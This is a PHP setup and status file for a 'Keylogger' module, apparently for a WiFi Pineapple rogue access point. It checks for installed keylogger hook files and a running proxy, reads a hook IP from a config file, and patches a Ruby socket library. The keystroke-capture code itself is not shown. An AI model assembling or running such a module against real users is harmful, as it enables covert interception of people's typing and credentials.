<?php

putenv('LD_LIBRARY_PATH='.getenv('LD_LIBRARY_PATH').':/usb/lib:/usb/usr/lib');   
putenv('PATH='.getenv('PATH').':/usb/usr/bin:/usb/usr/sbin');

$module_name = "Keylogger";
$module_path = exec("pwd")."/";
$module_version = "1.1";

$usb_mnt = exec("mount | grep \"on /usb\"") != "" ? 1 : 0;
$on_usb = strpos($module_path, "usb") !== false ? 1 : 0;

$installed = file_exists($module_path."installed") ? 1 : 0;

$is_keylogger_installed = file_exists("/www/k.php") && file_exists("/www/k.js") && file_exists("/www/capture") ? 1 : 0;
$is_keylogger_running = exec("ps auxww | grep proxy.sh | grep -v -e grep") != "" ? 1 : 0;

$keylogger_conf = parse_ini_file($module_path."keylogger.conf");
$keylogger_hook_ip = $keylogger_conf['ip'];

$pineapple_ip = exec("ifconfig br-lan | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'");

if(!file_exists("/usr/lib/ruby") && file_exists("/usb/usr/lib/ruby/"))
{
	exec("ln -s /usb/usr/lib/ruby/ /usr/lib/ruby");
}

$is_rubby_patched = file_exists($module_path."patched") ? 1 : 0;
if(!$is_rubby_patched)
{
	exec("cp ".$module_path."dep/socket.so /usr/lib/ruby/1.9/mips-linux/");
	exec("touch ".$module_path."patched");
}

function dataSize($path)
{
    $blah = exec( "/usr/bin/du -sch $path | tail -1 | awk {'print $1'}" );
    return $blah;
}

?>